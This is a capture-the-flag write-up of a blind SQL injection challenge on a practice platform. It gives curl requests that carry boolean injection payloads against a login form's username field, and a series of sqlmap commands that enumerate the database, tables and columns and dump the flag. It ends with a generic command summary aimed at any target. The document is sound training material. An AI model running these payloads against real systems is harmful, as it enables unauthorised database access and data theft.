web-security/blind-sqli.md

# Blind SQL Injection — Pentest Garage

## Challenge Information

- **Platform:** Pentest Garage
- **Category:** Web Security
- **Vulnerability:** Blind SQL Injection
- **Injection Point:** `username` POST parameter
- **Technique:** Time-Based Blind SQL Injection
- **Database:** `vulnapp`
- **DBMS:** MySQL / MariaDB

---

## 1. Reconnaissance

The challenge presented a login form.

The application used:

```http
POST /index.php

The form contained three relevant parameters:
username
password
login

The username parameter was the main parameter tested for SQL injection.
Inspect the application
curl -s 'http://ctf-shaunmatthew022-blind-sqli-21f06265.challenges.pentestgarage.com/'

Why?
This lets us inspect the HTML and identify:
- the form action
- the HTTP method
- parameter names
2. Establish a Normal Login Response
We first submitted a normal login with an intentionally incorrect password.
curl -s -X POST 'http://ctf-shaunmatthew022-blind-sqli-21f06265.challenges.pentestgarage.com/index.php' \
-d 'username=admin&password=wrongpassword&login=Login'

Result
Error: Invalid Credentials

Why?
We need a baseline response so that we can compare it against SQL injection tests.
3. Test a TRUE SQL Condition
We injected a condition that is always true:
curl -s -X POST 'http://ctf-shaunmatthew022-blind-sqli-21f06265.challenges.pentestgarage.com/index.php' \
--data-urlencode "username=admin' AND 1=1-- -" \
-d 'password=wrongpassword&login=Login'

Result
Hello, Hacker!

Payload breakdown
admin'

Attempts to terminate the application's SQL string.
AND 1=1

Adds a condition that is always TRUE.
-- -

Starts an SQL comment, causing the rest of the original SQL statement to be ignored.
Conceptually, the application may be constructing a query similar to:
SELECT * FROM users
WHERE username = 'admin'
AND password = 'wrongpassword';

The injected input can change the logic so that the password portion is effectively bypassed.
4. Test a FALSE SQL Condition
We then used a condition that is always false:
curl -s -X POST 'http://ctf-shaunmatthew022-blind-sqli-21f06265.challenges.pentestgarage.com/index.php' \
--data-urlencode "username=admin' AND 1=2-- -" \
-d 'password=wrongpassword&login=Login'

Result
Error: Invalid Credentials

Comparison
1=1 → Hello, Hacker!

1=2 → Invalid Credentials

This confirmed that the username parameter could influence the SQL query.
5. Identify the Injection with SQLMap
Instead of manually extracting information one character at a time, we used SQLMap.
sqlmap -u "http://ctf-shaunmatthew022-blind-sqli-21f06265.challenges.pentestgarage.com/index.php" \
--data="username=admin&password=wrongpassword&login=Login" \
-p username \
--batch

What the options mean
-u

Specifies the target URL.
--data

Specifies the POST request body.
-p username

Tells SQLMap to test only the username parameter.
--batch

Automatically answers SQLMap's interactive questions.
SQLMap result
SQLMap identified:
Parameter: username (POST)
Type: time-based blind
DBMS: MySQL / MariaDB



6. Understand Time-Based Blind SQL Injection
In a blind SQL injection, the application does not directly display arbitrary database results.
Instead, information can be inferred indirectly.
For a time-based attack, SQLMap can cause the database to deliberately delay its response when a condition is true.
Conceptually:
Condition TRUE
      ↓
Database executes SLEEP(...)
      ↓
Response is delayed

Whereas:
Condition FALSE
      ↓
No delay
      ↓
Normal response

SQLMap automates these timing comparisons to extract information.
7. Find the Current Database
sqlmap -u "http://ctf-shaunmatthew022-blind-sqli-21f06265.challenges.pentestgarage.com/index.php" \
--data="username=admin&password=wrongpassword&login=Login" \
-p username \
--current-db \
--batch

Result
vulnapp

Therefore:
Current database = vulnapp

Why?
--current-db asks SQLMap to determine which database the application is currently using.
8. Enumerate Tables
Now that we know the database name, we can enumerate its tables.
sqlmap -u "http://ctf-shaunmatthew022-blind-sqli-21f06265.challenges.pentestgarage.com/index.php" \
--data="username=admin&password=wrongpassword&login=Login" \
-p username \
-D vulnapp \
--tables \
--batch

What the options mean
-D vulnapp

Selects the vulnapp database.
--tables

Asks SQLMap to enumerate tables in that database.
Result
flag
users

The interesting table was:
flag

9. Enumerate Columns in the Flag Table
Next we inspected the structure of the flag table.
sqlmap -u "http://ctf-shaunmatthew022-blind-sqli-21f06265.challenges.pentestgarage.com/index.php" \
--data="username=admin&password=wrongpassword&login=Login" \
-p username \
-D vulnapp \
-T flag \
--columns \
--batch

What the options mean
-T flag

Selects the flag table.
--columns

Enumerates the columns contained in that table.
Result
flag

The table contained one column:
flag

10. Dump the Flag
Now we only needed the contents of the flag column.
sqlmap -u "http://ctf-shaunmatthew022-blind-sqli-21f06265.challenges.pentestgarage.com/index.php" \
--data="username=admin&password=wrongpassword&login=Login" \
-p username \
-D vulnapp \
-T flag \
-C flag \
--dump \
--batch

What the options mean
-C flag

Selects only the flag column.
--dump

Retrieves the actual stored value.
Result
ctf{inject!ng_bl!nd}

11. Final Flag
ctf{inject!ng_bl!nd}

12. Attack Flow
Login form
    ↓
username parameter
    ↓
Test normal request
    ↓
Test TRUE condition
    ↓
Test FALSE condition
    ↓
SQL Injection confirmed
    ↓
SQLMap
    ↓
Time-Based Blind SQLi
    ↓
Current database
    ↓
vulnapp
    ↓
Tables
    ↓
flag, users
    ↓
flag table
    ↓
flag column
    ↓
Dump
    ↓
ctf{inject!ng_bl!nd}

13. Important Commands Summary
Check the application
curl -s 'http://TARGET/'

Normal login
curl -s -X POST 'http://TARGET/index.php' \
-d 'username=admin&password=wrongpassword&login=Login'

TRUE condition
curl -s -X POST 'http://TARGET/index.php' \
--data-urlencode "username=admin' AND 1=1-- -" \
-d 'password=wrongpassword&login=Login'

FALSE condition
curl -s -X POST 'http://TARGET/index.php' \
--data-urlencode "username=admin' AND 1=2-- -" \
-d 'password=wrongpassword&login=Login'

Detect SQLi
sqlmap -u "http://TARGET/index.php" \
--data="username=admin&password=wrongpassword&login=Login" \
-p username \
--batch

Find database
sqlmap -u "http://TARGET/index.php" \
--data="username=admin&password=wrongpassword&login=Login" \
-p username \
--current-db \
--batch

Find tables
sqlmap -u "http://TARGET/index.php" \
--data="username=admin&password=wrongpassword&login=Login" \
-p username \
-D vulnapp \
--tables \
--batch

Find columns
sqlmap -u "http://TARGET/index.php" \
--data="username=admin&password=wrongpassword&login=Login" \
-p username \
-D vulnapp \
-T flag \
--columns \
--batch

Dump flag
sqlmap -u "http://TARGET/index.php" \
--data="username=admin&password=wrongpassword&login=Login" \
-p username \
-D vulnapp \
-T flag \
-C flag \
--dump \
--batch

Key Learning
The main lesson from this challenge was not simply using SQLMap.
The methodology was:
Identify input
    ↓
Establish normal behavior
    ↓
Test SQL syntax
    ↓
Compare TRUE vs FALSE
    ↓
Confirm blind SQL injection
    ↓
Identify the injection technique
    ↓
Enumerate only what is necessary
    ↓
Extract the target data

Vulnerability
Time-Based Blind SQL Injection through the username POST parameter

So the confirmed vulnerability was:
Time-Based Blind SQL Injection
